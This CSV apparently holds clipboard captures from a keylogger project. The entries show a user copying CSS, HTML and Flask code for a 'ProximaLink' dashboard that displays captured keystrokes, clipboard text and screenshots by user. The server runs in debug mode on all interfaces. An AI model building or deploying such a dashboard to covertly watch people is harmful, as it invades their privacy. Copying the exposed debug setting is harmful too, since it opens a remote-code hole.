Timestamp,Username,IP,Data
  --secondary-red: #ab2e3c;
  --secondary-yellow: #ffc107;
}

body {
  font-family: 'Roboto', 'Open Sans', 'Lato', Arial, sans-serif;
  background-color: var(--black);
  color: var(--secondary-white);
  overflow-x: hidden;
  /* Prevent horizontal overflow */
}

header {
  background-color: var(--gray-dark);
  color: #fff;
  padding: 15px 0;
  text-align: center;
  width: 100%;
}

header .logo img {
  max-width: 100%;
  height: auto;
}

.container-fluid {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.logo {
  max-width: 150px;
  /* Adjust this value based on your preference */
}

/* User section */
.user-item {
  background-color: #00c7fd;
  /* Primary color */
  color: #fff;
  font-weight: 400;
  font-size: small;
  padding: 10px;
  margin-bottom: 5px;
  border-radius: 5px;
  cursor: pointer;
  text-align: center;
}

.user-item:hover {
  background-color: #0071c5;
  /* Darker shade on hover */
}"
2024-07-04 22:35:47,Toshiba,192.168.100.200,"aside {
  background-color: var(--gray-dark);
  color: #fff;
  padding-left: 0;
  /* Remove left padding */
  padding-right: 0;
}"
2024-07-04 22:36:17,Toshiba,192.168.100.200,"/* Tags */
.tags-container {
  margin-top: 10px;
}

.tag {
  cursor: pointer;
  padding: 5px 10px;
  background-color: #007bff;
  /* Primary color */
  color: #fff;
  border-radius: 8px;
  margin-right: 10px;
}

.tag:hover {
  background-color: #0056b3;
  /* Darker shade on hover */
}

/* Users section */
.user-section {
  margin-bottom: 20px;
  padding: 10px;
  border: 1px solid #ccc;
  border-radius: 5px;
}

.col-md-10 {
  padding: 30px;
}

/* Main content */
.main-content {
  padding: 20px 0;
  /* Fix comma here */
}

.user-section h2 {
  color: #0071c5;
  /* Primary color */
  font-weight: 600;
  border-bottom: 2px solid #ccc;
  padding-bottom: 10px;
}
"
2024-07-04 22:36:29,Toshiba,192.168.100.200,"footer {
  background-color: #191c24;
  position: fixed;
  left: 0;
  bottom: 0;
  width: 100%;
  color: white;
  text-align: center;
}

footer p {
  margin-top: 15px;
}"
2024-07-04 22:36:52,Toshiba,192.168.100.200,"<link
      rel=""stylesheet""
      href=""{{ url_for('static', filename='styles.css') }}""
    />"
2024-07-04 22:37:28,Toshiba,192.168.100.200,"<link
      rel=""stylesheet""
      href=""{{ url_for('static', filename='main.css') }}""
    />"
2024-07-04 22:38:57,Toshiba,192.168.100.200,-->
2024-07-04 22:58:04,Toshiba,192.168.100.200,screenshots-container
2024-07-04 23:03:56,Toshiba,192.168.100.200,column-gap
2024-07-05 11:48:41,Toshiba,192.168.100.200,Sample clipboard text
2024-07-05 11:48:44,Toshiba,192.168.100.200,C:\Users\Toshiba\Desktop\D\Designing\Python\Django\ProximaLinkMonitoringApp\keylogger_project\test
2024-07-05 11:49:40,Toshiba,192.168.100.200,C:\Users\Toshiba\Desktop\D\Designing\Python\Django\ProximaLinkMonitoringApp\keylogger_project\test\LoggedData\Toshiba\Screenshot
2024-07-05 11:52:03,Toshiba,192.168.100.200,"function fetchLogs() {
            $.ajax({
                url: '/get_logs',
                method: 'GET',
                success: function (data) {
                    // Clear the current logs
                    $('#log-container').empty();

                    // Append new logs
                    data.forEach(function (log) {
                        $('#log-container').append(
                            `<div class=""log-entry"">
                                <div class=""timestamp"">${log.timestamp}</div>
                                <div class=""log-content"">${log.content}</div>
                            </div>`
                        );
                    });
                },
                error: function (error) {
                    console.log('Error fetching logs:', error);
                }
            });
        }

        // Fetch logs every 5 seconds
        setInterval(fetchLogs, 5000);

        // Initial fetch
        fetchLogs();"
2024-07-05 11:56:23,Toshiba,192.168.100.200,"<script src=""{{ url_for('static', filename='app.js') }}""></script>"
2024-07-05 11:56:31,Toshiba,192.168.100.200,"$(document).ready(function () {
        // Handle click on Keystrokes button
        $(""#btnKeystrokes"").click(function () {
          $(""#keystrokesContent"").show(); // Show Keystrokes content
          $(""#screenshotsContent"").hide(); // Hide Screenshots content
        });

        // Handle click on Screenshots button
        $(""#btnScreenshots"").click(function () {
          // Load content from screenshots.html using AJAX
          $.ajax({
            url: ""screenshots.html"",
            type: ""GET"",
            success: function (data) {
              $(""#screenshotsContent"").html(data); // Load HTML content into screenshotsContent div
              $(""#screenshotsContent"").show(); // Show Screenshots content
              $(""#keystrokesContent"").hide(); // Hide Keystrokes content
            },
            error: function (xhr, status, error) {
              console.error(""Error loading screenshots:"", error);
              // Handle error loading screenshots.html
            },
          });
        });

        // Handle click on Videos button (if needed)
        $(""#btnVideos"").click(function () {
          // Handle click on Videos button if required
        });
      });"
2024-07-05 11:57:25,Toshiba,192.168.100.200,"# server.py

from flask import Flask, render_template, g, send_from_directory, request, jsonify
import sqlite3
import os
import subprocess
import requests


app = Flask(__name__)
DB_FILE = ""./db/keylogs.db""
SCREENSHOT_DIR = r""C:\Users\Toshiba\Desktop\D\Designing\Python\Django\ProximaLinkMonitoringApp\keylogger_project\test\LoggedData""


def get_db():
    db = getattr(g, ""_database"", None)
    if db is None:
        db = g._database = sqlite3.connect(DB_FILE)
    return db


@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, ""_database"", None)
    if db is not None:
        db.close()


def get_unique_users():
    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        c.execute(""SELECT DISTINCT username FROM logs"")
        rows = c.fetchall()
    return [row[0] for row in rows]


def get_user_logs():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        ""SELECT timestamp, username, ip, text, 'keystroke' as type FROM logs ORDER BY timestamp DESC""
    )
    logs = c.fetchall()
    conn.close()
    return [
        {
            ""timestamp"": row[0],
            ""username"": row[1],
            ""ip"": row[2],
            ""text"": row[3],
            ""type"": row[4],
        }
        for row in logs
    ]


def get_clipboard_logs():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        ""SELECT timestamp, username, ip, text, 'clipboard' as type FROM clipboard_logs ORDER BY timestamp DESC""
    )
    logs = c.fetchall()
    conn.close()
    return [
        {
            ""timestamp"": row[0],
            ""username"": row[1],
            ""ip"": row[2],
            ""text"": row[3],
            ""type"": row[4],
        }
        for row in logs
    ]


def get_screenshot_logs():
    screenshots = []
    for user_dir in os.listdir(SCREENSHOT_DIR):
        user_dir_path = os.path.join(SCREENSHOT_DIR, user_dir)
        screenshot_dir = os.path.join(user_dir_path, ""Screenshot"")

        if os.path.isdir(screenshot_dir):
            for file in os.listdir(screenshot_dir):
                if file.endswith("".png"") or file.endswith("".jpg""):
                    screenshot_path = os.path.join(screenshot_dir, file)
                    screenshots.append(
                        {
                            ""username"": user_dir,
                            ""image_path"": screenshot_path,
                            ""filename"": file,
                        }
                    )
    return screenshots


@app.route(""/"")
def dashboard():
    unique_users = get_unique_users()
    user_logs = get_user_logs()
    clipboard_logs = get_clipboard_logs()
    all_logs = user_logs + clipboard_logs
    all_logs = sorted(
        all_logs, key=lambda k: k[""timestamp""], reverse=True
    )  # Sort logs by timestamp
    return render_template(""index.html"", unique_users=unique_users, all_logs=all_logs)


@app.route(""/screenshots"")
def screenshots():
    screenshots = get_screenshot_logs()
    return render_template(""screenshot.html"", screenshots=screenshots)


@app.route(""/screenshots/<path:filename>"")
def serve_screenshot(filename):
    return send_from_directory(SCREENSHOT_DIR, filename)


@app.route(""/testing"")
def testing():
    unique_users = get_unique_users()
    user_logs = get_user_logs()
    clipboard_logs = get_clipboard_logs()
    all_logs = user_logs + clipboard_logs
    all_logs = sorted(
        all_logs, key=lambda k: k[""timestamp""], reverse=True
    )  # Sort logs by timestamp
    screenshots = get_screenshot_logs()
    return render_template(
        ""testing.html"",
        screenshots=screenshots,
        unique_users=unique_users,
        all_logs=all_logs,
    )


if __name__ == ""__main__"":

    app.run(host=""0.0.0.0"", port=8080, debug=True)
"
2024-07-05 11:58:14,Toshiba,192.168.100.200,"<!DOCTYPE html>
<html lang=""en"">
  <head>
    <meta charset=""UTF-8"" />
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"" />
    <title>ProximaLink Dashboard</title>
    <link
      href=""https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap""
      rel=""stylesheet""
    />
    <link
      href=""https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;700&display=swap""
      rel=""stylesheet""
    />
    <link
      href=""https://fonts.googleapis.com/css2?family=Lato:wght@400;700&display=swap""
      rel=""stylesheet""
    />
    <link
      rel=""stylesheet""
      href=""https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css""
    />
    <link
      rel=""stylesheet""
      href=""{{ url_for('static', filename='styles.css') }}""
    />
    <link
      rel=""stylesheet""
      href=""{{ url_for('static', filename='main.css') }}""
    />
  </head>
  <body>
    <header class=""flex-fill align-self-center"">
      <div class=""container-fluid flex-fill align-items-center"">
        <div class=""flex-grow-1 logo"">
          <img
            src=""/static/icons/PureWhite.png""
            class=""img-fluid""
            alt=""logo-white""
          />
        </div>
        <div class=""header-content flex-fill"">
          <h1>ProximaLink Dashboard</h1>
          <p>Welcome to the monitoring dashboard.</p>
        </div>
      </div>
    </header>

    <div class=""container-fluid"">
      <div class=""row"">
        <aside class=""col-md-2 py-3"">
          <h2>Users</h2>
          <ul class=""list-unstyled"">
            {% if unique_users %} {% for user in unique_users %}
            <li class=""user-item"">{{ user }}</li>
            {% endfor %} {% else %}
            <p>No users found yet.</p>
            {% endif %}
          </ul>
        </aside>

        <main class=""col-md-10"">
          <div class=""d-flex justify-content-between align-self-center"">
            <div class=""col-btn"">
              <!-- Buttons Section -->
              <div
                class=""btn-group d-flex align-items-start""
                role=""group""
                aria-label=""Toggle Buttons""
              >
                <button
                  type=""button""
                  class=""btn rounded-pill btn-primary mx-2""
                  id=""btnKeystrokes""
                  data-toggle=""button"" 
                  aria-pressed=""false""
                >
                  Keystrokes

            </button>
                <button
                  class=""btn rounded-pill btn-outline-primary active mx-2""
                  id=""btnScreenshots""
                  data-toggle=""button"" 
                  aria-pressed=""false""
                  >

                  Screenshots

                <button
                  type=""button""
                  class=""btn rounded-pill btn-outline-primary mx-2""
                  id=""btnVideos""
                  data-toggle=""button"" 
                  aria-pressed=""false""
                >
                  Videos
                </button>
              </div>
            </div>
          </div>

          <!-- Vertical Separator -->
          <div class=""col-1 separator"">
            <hr class=""my-3"" />
          </div>

          <!-- Content Sections -->
          
              <div class=""col"">
                {% if all_logs %} {% for log in all_logs %}
                <div class=""log-entry border rounded mb-3"">
                  <p>{{ log.text }}</p>
                  <p class=""timestamp text-left"">{{ log.timestamp }}</p>
                </div>
                {% endfor %} {% else %}
                <!-- Display a message if no logs are found -->
                <div class=""alert alert-info text-center"" role=""alert"">
                  No logs found yet. Monitor activity for data to appear.
                </div>
                {% endif %}
              </div>

          <div id=""screenshotsContent"" style=""display: none"">
            <!-- Placeholder for Screenshots content loaded via AJAX -->
          </div>
        </main>
      </div>
    </div>

    <footer style=""margin-top: 15px"">
      <p>ProximaLink Monitoring &copy; 2024</p>
    </footer>

    <!-- JavaScript Libraries -->
    <script src=""https://code.jquery.com/jquery-3.6.0.min.js""></script>
    <script src=""https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js""></script>
    <script src=""https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js""></script>
    <script src=""{{ url_for('static', filename='app.js') }}""></script>

  </body>
</html>
"
2024-07-05 11:59:35,Toshiba,192.168.100.200,"from flask import Flask, render_template, g, send_from_directory, request, jsonify
import sqlite3
import os

app = Flask(__name__)
DB_FILE = ""./db/keylogs.db""
SCREENSHOT_DIR = r""C:\Users\Toshiba\Desktop\D\Designing\Python\Django\ProximaLinkMonitoringApp\keylogger_project\test\LoggedData""


def get_db():
    db = getattr(g, ""_database"", None)
    if db is None:
        db = g._database = sqlite3.connect(DB_FILE)
    return db


@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, ""_database"", None)
    if db is not None:
        db.close()


def get_unique_users():
    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        c.execute(""SELECT DISTINCT username FROM logs"")
        rows = c.fetchall()
    return [row[0] for row in rows]


def get_user_logs():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        ""SELECT timestamp, username, ip, text, 'keystroke' as type FROM logs ORDER BY timestamp DESC""
    )
    logs = c.fetchall()
    conn.close()
    return [
        {
            ""timestamp"": row[0],
            ""username"": row[1],
            ""ip"": row[2],
            ""text"": row[3],
            ""type"": row[4],
        }
        for row in logs
    ]


def get_clipboard_logs():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        ""SELECT timestamp, username, ip, text, 'clipboard' as type FROM clipboard_logs ORDER BY timestamp DESC""
    )
    logs = c.fetchall()
    conn.close()
    return [
        {
            ""timestamp"": row[0],
            ""username"": row[1],
            ""ip"": row[2],
            ""text"": row[3],
            ""type"": row[4],
        }
        for row in logs
    ]


def get_screenshot_logs():
    screenshots = []
    for user_dir in os.listdir(SCREENSHOT_DIR):
        user_dir_path = os.path.join(SCREENSHOT_DIR, user_dir)
        screenshot_dir = os.path.join(user_dir_path, ""Screenshot"")

        if os.path.isdir(screenshot_dir):
            for file in os.listdir(screenshot_dir):
                if file.endswith("".png"") or file.endswith("".jpg""):
                    screenshot_path = os.path.join(screenshot_dir, file)
                    screenshots.append(
                        {
                            ""username"": user_dir,
                            ""image_path"": screenshot_path,
                            ""filename"": file,
                        }
                    )
    return screenshots


@app.route(""/"")
def dashboard():
    unique_users = get_unique_users()
    user_logs = get_user_logs()
    clipboard_logs = get_clipboard_logs()
    all_logs = user_logs + clipboard_logs
    all_logs = sorted(
        all_logs, key=lambda k: k[""timestamp""], reverse=True
    )  # Sort logs by timestamp
    return render_template(""index.html"", unique_users=unique_users, all_logs=all_logs)


@app.route(""/screenshots"")
def screenshots():
    screenshots = get_screenshot_logs()
    return render_template(""screenshot.html"", screenshots=screenshots)


@app.route(""/screenshots/<path:filename>"")
def serve_screenshot(filename):
    return send_from_directory(SCREENSHOT_DIR, filename)


@app.route(""/testing"")
def testing():
    unique_users = get_unique_users()
    user_logs = get_user_logs()
    clipboard_logs = get_clipboard_logs()
    all_logs = user_logs + clipboard_logs
    all_logs = sorted(
        all_logs, key=lambda k: k[""timestamp""], reverse=True
    )  # Sort logs by timestamp
    screenshots = get_screenshot_logs()
    return render_template(
        ""testing.html"",
        screenshots=screenshots,
        unique_users=unique_users,
        all_logs=all_logs,
    )


@app.route(""/get_logs"", methods=[""GET""])
def get_logs():
    user_logs = get_user_logs()
    clipboard_logs = get_clipboard_logs()
    all_logs = user_logs + clipboard_logs
    all_logs = sorted(
        all_logs, key=lambda k: k[""timestamp""], reverse=True
    )  # Sort logs by timestamp
    return jsonify(all_logs)


if __name__ == ""__main__"":
    app.run(host=""0.0.0.0"", port=8080, debug=True)
"
2024-07-05 12:05:02,Toshiba,192.168.100.200,"<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>ProximaLink Dashboard</title>
    <link href=""https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap"" rel=""stylesheet"">
    <link href=""https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;700&display=swap"" rel=""stylesheet"">
    <link href=""https://fonts.googleapis.com/css2?family=Lato:wght@400;700&display=swap"" rel=""stylesheet"">
    <link rel=""stylesheet"" href=""https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"">
    <link rel=""stylesheet"" href=""{{ url_for('static', filename='styles.css') }}"">
    <link rel=""stylesheet"" href=""{{ url_for('static', filename='main.css') }}"">
</head>
<body>
    <header class=""flex-fill align-self-center"">
        <div class=""container-fluid flex-fill align-items-center"">
            <div class=""flex-grow-1 logo"">
                <img src=""/static/icons/PureWhite.png"" class=""img-fluid"" alt=""logo-white"">
            </div>
            <div class=""header-content flex-fill"">
                <h1>ProximaLink Dashboard</h1>
                <p>Welcome to the monitoring dashboard.</p>
            </div>
        </div>
    </header>

    <div class=""container-fluid"">
        <div class=""row"">
            <aside class=""col-md-2 py-3"">
                <h2>Users</h2>
                <ul class=""list-unstyled"">
                    {% if unique_users %} 
                    {% for user in unique_users %}
                    <li class=""user-item"">{{ user }}</li>
                    {% endfor %} 
                    {% else %}
                    <p>No users found yet.</p>
                    {% endif %}
                </ul>
            </aside>

            <main class=""col-md-10"">
                <div class=""d-flex justify-content-between align-self-center"">
                    <div class=""col-btn"">
                        <!-- Buttons Section -->
                        <div class=""btn-group d-flex align-items-start"" role=""group"" aria-label=""Toggle Buttons"">
                            <button type=""button"" class=""btn rounded-pill btn-primary mx-2"" id=""btnKeystrokes"" data-toggle=""button"" aria-pressed=""false"">Keystrokes</button>
                            <button class=""btn rounded-pill btn-outline-primary active mx-2"" id=""btnScreenshots"" data-toggle=""button"" aria-pressed=""false"">Screenshots</button>
                            <button type=""button"" class=""btn rounded-pill btn-outline-primary mx-2"" id=""btnVideos"" data-toggle=""button"" aria-pressed=""false"">Videos</button>
                        </div>
                    </div>
                </div>

                <!-- Vertical Separator -->
                <div class=""col-1 separator"">
                    <hr class=""my-3"">
                </div>

                <!-- Content Sections -->
                <div class=""col"" id=""log-container"">
                    <!-- Logs will be dynamically loaded here via AJAX -->
                </div>

                <div id=""screenshotsContent"" style=""display: none"">
                    <!-- Placeholder for Screenshots content loaded via AJAX -->
                </div>
            </main>
        </div>
    </div>

    <footer style=""margin-top: 15px"">
        <p>ProximaLink Monitoring &copy; 2024</p>
    </footer>

    <!-- JavaScript Libraries -->
    <script src=""https://code.jquery.com/jquery-3.6.0.min.js""></script>
    <script src=""https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js""></script>
    <script src=""https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js""></script>
    <script src=""{{ url_for('static', filename='app.js') }}""></script>
</body>
</html>
"
2024-07-05 12:05:36,Toshiba,192.168.100.200,http://localhost:8080/
2024-07-05 12:10:44,Toshiba,192.168.100.200,"2024-07-05 12:09:39
undefined
2024-07-05 12:07:20
undefined
2024-07-05 12:05:43
undefined
2024-07-05 12:05:36
undefined
2024-07-05 12:05:02
undefined
2024-07-05 12:00:51
undefined
2024-07-05 11:59:35
undefined"
2024-07-05 12:14:26,Toshiba,192.168.100.200,"<!DOCTYPE html>
<html lang=""en"">
  <head>
    <meta charset=""UTF-8"" />
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"" />
    <title>ProximaLink Dashboard</title>
    <link
      href=""https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap""
      rel=""stylesheet""
    />
    <link
      href=""https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;700&display=swap""
      rel=""stylesheet""
    />
    <link
      href=""https://fonts.googleapis.com/css2?family=Lato:wght@400;700&display=swap""
      rel=""stylesheet""
    />
    <link
      rel=""stylesheet""
      href=""https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css""
    />
    <link
      rel=""stylesheet""
      href=""{{ url_for('static', filename='styles.css') }}""
    />
    <link
      rel=""stylesheet""
      href=""{{ url_for('static', filename='main.css') }}""
    />
   
  </head>
  <body>
    <header class=""flex-fill align-self-center"">
      <div class=""container-fluid flex-fill align-items-center"">
        <div class=""flex-grow-1 logo"">
          <img
            src=""/static/icons/PureWhite.png""
            class=""img-fluid""
            alt=""logo-white""
          />
        </div>
        <div class=""header-content flex-fill"">
          <h1>ProximaLink Dashboard</h1>
          <p>Welcome to the monitoring dashboard.</p>
        </div>
      </div>
    </header>

    <div class=""container-fluid"">
      <div class=""row"">
        <aside class=""col-md-2 py-3"">
          <h2>Users</h2>
          <ul class=""list-unstyled"">
            {% if unique_users %} {% for user in unique_users %}
            <li class=""user-item"">{{ user }}</li>
            {% endfor %} {% else %}
            <p>No users found yet.</p>
            {% endif %}
          </ul>
        </aside>

        <main class=""col-md-10"">
          <div class=""d-flex justify-content-between align-self-center"">
            <div class=""col-btn"">
              <!-- Buttons Section -->
              <div
                class=""btn-group d-flex align-items-start""
                role=""group""
                aria-label=""Toggle Buttons""
              >
                <button
                  type=""button""
                  class=""btn rounded-pill btn-primary mx-2""
                  id=""btnKeystrokes""
                  data-toggle=""button"" 
                  aria-pressed=""false""
                >
                  Keystrokes

            </button>
                <button
                  class=""btn rounded-pill btn-outline-primary active mx-2""
                  id=""btnScreenshots""
                  data-toggle=""button"" 
                  aria-pressed=""false""
                  >

                  Screenshots

                <button
                  type=""button""
                  class=""btn rounded-pill btn-outline-primary mx-2""
                  id=""btnVideos""
                  data-toggle=""button"" 
                  aria-pressed=""false""
                >
                  Videos
                </button>
              </div>
            </div>
          </div>

          <!-- Vertical Separator -->
          <div class=""col-1 separator"">
            <hr class=""my-3"" />
          </div>

          <div class=""screenshots-container"">
  {% for screenshot in screenshots %}
  <div class=""screenshot-item"">
    <img
      src=""http://localhost:8000/{{ screenshot.filename }}""
      alt=""Screenshot""
      class=""screenshot-thumbnail""
      data-image=""http://localhost:8000/{{ screenshot.filename }}""
      data-toggle=""modal""
      data-target=""#overlayModal""
      data-caption=""Username: {{ screenshot.username }}""
    />
  </div>
  {% endfor %}
</div>

<!-- Modal for overlay view -->
<div class=""modal fade"" id=""overlayModal"" tabindex=""-1"" role=""dialog"" aria-labelledby=""overlayModalLabel"" aria-hidden=""true"">
  <div class=""modal-dialog modal-dialog-centered modal-lg"" role=""document"">
    <div class=""modal-content"">
      <div class=""modal-body"">
        <button type=""button"" class=""close nav-btn-top-right"" data-dismiss=""modal"" aria-label=""Close"">
          <span aria-hidden=""true"">&times;</span>
        </button>
        <button class=""nav-btn nav-btn-left"" id=""prevImage"">&lt;</button>
        <button class=""nav-btn nav-btn-right"" id=""nextImage"">&gt;</button>
        <img src="""" class=""img-fluid"" id=""overlayImage"" />
      </div>
      <div class=""modal-footer justify-content-center"">
        <div class=""nav-dots"" id=""navDots""></div>
      </div>
    </div>
  </div>
</div>


</main>


    <footer style=""margin-top: 15px"">
      <p>ProximaLink Monitoring &copy; 2024</p>
    </footer>

    <!-- JavaScript Libraries -->
    <script src=""https://code.jquery.com/jquery-3.6.0.min.js""></script>
    <script src=""https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js""></script>
    <script src=""https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js""></script>
    <script src=""{{url_for('static', filename=""screenshot.js"")}}"">
</script>
  </body>
</html>
"
2024-07-05 12:15:44,Toshiba,192.168.100.200,"unique_users = get_unique_users()
    user_logs = get_user_logs()"
2024-07-05 12:17:41,Toshiba,192.168.100.200,"<iframe src=""https://www.w3schools.com"" title=""W3Schools Free Online Web Tutorials""></iframe>
"
2024-07-05 12:19:20,Toshiba,192.168.100.200,"<iframe src=""https://www.w3schools.com""></iframe>
"
2024-07-05 12:20:31,Toshiba,192.168.100.200," <iframe  width=""100%"" height=""100%"" src=""https://www.google.co.za/"" frameborder=""0"" scrolling=""auto"" allowfullscreen>
 </iframe>"
2024-07-05 12:25:27,Toshiba,192.168.100.200,Content-Security-Policy: frame-ancestors 'self'
2024-07-05 12:30:50,Toshiba,192.168.100.200,"<iframe  width=""100%"" height=""100%"" src=""/templates/screenshot.html"" frameborder=""0"" scrolling=""auto"" allowfullscreen>
            </iframe>"
2024-07-05 12:32:37,Toshiba,192.168.100.200,"<div id=""iframe-container"" style=""display: none;"">
                    <iframe id=""screenshot-iframe"" width=""100%"" height=""100%"" frameborder=""0"" scrolling=""auto"" allowfullscreen></iframe>
                </div>"
2024-07-05 12:34:29,Toshiba,192.168.100.200,"$(document).ready(function () {
    fetchLogs();

    $('#btnScreenshots').on('click', function () {
        // Show the iframe and load the screenshot page
        $('#log-container').hide();
        $('#iframe-container').show();
        $('#screenshot-iframe').attr('src', '/screenshots');
    });

    $('#btnKeystrokes, #btnVideos').on('click', function () {
        // Show the logs and hide the iframe
        $('#log-container').show();
        $('#iframe-container').hide();
    });
});"
2024-07-05 12:34:48,Toshiba,192.168.100.200,"<iframe id=""screenshot-iframe"" width=""100%"" height=""100%"" frameborder=""0"" scrolling=""auto"" allowfullscreen=""""></iframe>"
2024-07-05 12:35:07,Toshiba,192.168.100.200,/html/body/div/div[1]/main/div[3]/iframe
2024-07-05 12:36:10,Toshiba,192.168.100.200,"Frames must have an accessible name: Element has no title attribute
<iframe id=""screenshot-iframe"" width=""100%"" height=""100%"" frameborder=""0"" scrolling=""auto"" allowfullscreen="""">"
